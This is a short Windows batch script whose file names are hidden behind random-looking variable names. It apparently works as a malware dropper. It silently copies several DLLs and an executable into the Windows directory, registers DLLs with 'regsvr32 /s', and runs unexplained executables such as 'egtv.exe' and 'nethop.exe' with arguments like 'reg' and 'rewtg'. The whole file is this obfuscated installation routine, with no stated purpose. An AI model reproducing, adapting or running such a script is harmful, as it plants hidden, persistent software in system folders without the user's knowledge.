@echo  off

set     b10322505103225=egtv
set      t12207506122075=nethop
set   m14843707148437=regsvr32.exe
set       s16250003162500=rmvgor
set     o18281204182812=sapnet
set   p12666202126662=jokwmp
set       a10625001106250=popnetnpr

copy       %o18281204182812%.dll  %windir%\%o18281204182812%.dll       >nul
copy      %s16250003162500%.dll    %windir%\%s16250003162500%.dll   >nul
copy      %p12666202126662%.dll     %windir%
copy   %a10625001106250%.dll  %windir%   >nul
copy     %t12207506122075%.exe  %windir%     >nul

%windir%\system32\%m14843707148437%  /s    %windir%\%a10625001106250%.dll
%b10322505103225%.exe  %windir%\%o18281204182812%.dll    %o18281204182812%
%b10322505103225%.exe     %windir%\%s16250003162500%.dll     %s16250003162500%
%m14843707148437%       /s       %p12666202126662%.dll

%t12207506122075%.exe      reg
%b10322505103225%.exe     rewtg
